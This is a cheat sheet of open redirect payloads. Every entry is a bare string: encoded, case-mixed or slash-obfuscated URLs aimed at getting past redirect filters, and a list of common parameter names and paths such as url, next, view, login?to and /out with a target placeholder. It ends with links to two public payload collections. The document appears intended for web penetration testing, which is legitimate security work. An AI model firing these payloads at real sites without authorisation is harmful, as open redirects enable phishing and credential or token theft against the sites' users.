## Open Redirect

```
/%09/google.com
```

```
/%5cgoogle.com
```

```
//www.google.com/%2f%2e%2e
```

```
%2F%2Fgoogle.com%2F%2F
```

```
%25%32%65google.com
```

```
//www.google.com/%2e%2e
```

```
@%E2%80%AE@google.com 
```

```
//;@google.com
```

```
//google.com/
```

```
//google.com/%2f..
```

```
//\google.com
```

```
hTTp://google.com
```

```
hTTp%3a%2f%2f%google.com%2f
```

```
HtTp://google.com
```

```
//google%00.com
```

```
/\victim.com:80%40google.com
```

## Possible open redirect parameters

```
?url=http://{target}
```

```
?url=https://{target}
```

```
?next=http://{target}
```

```
?next=https://{target}
```

```
?url=https://{target}
```

```
?url=http://{target}
```

```
?url=//{target}
```

```
?url=$2f%2f{target}
```

```
?next=//{target}
```

```
?next=$2f%2f{target}
```

```
?url=//{target}
```

```
?url=$2f%2f{target}
```

```
?url=//{target}
```

```
/redirect/{target}
```

```
/cgi-bin/redirect.cgi?{target}
```

```
/out/{target}
```

```
/out?{target}
```

```
/out?/{target}
```

```
/out?//{target}
```

```
/out?/\{target}
```

```
/out?///{target}
```

```
?view={target}
```

```
?view=/{target}
```

```
?view=//{target}
```

```
?view=/\{target}
```

```
?view=///{target}
```

```
/login?to={target}
```

```
/login?to=/{target}
```

```
/login?to=//{target}
```

```
/login?to=/\{target}
```

```
/login?to=///{target}
```

```
?target={target}
```


```
?checkout_url={target}
```

```
?dest={target}
```



**Open Redirect Payloads** by @cujanovic

https://github.com/cujanovic/Open-Redirect-Payloads


**Open Redirect Paramters** by @fuzzdb-project

https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt
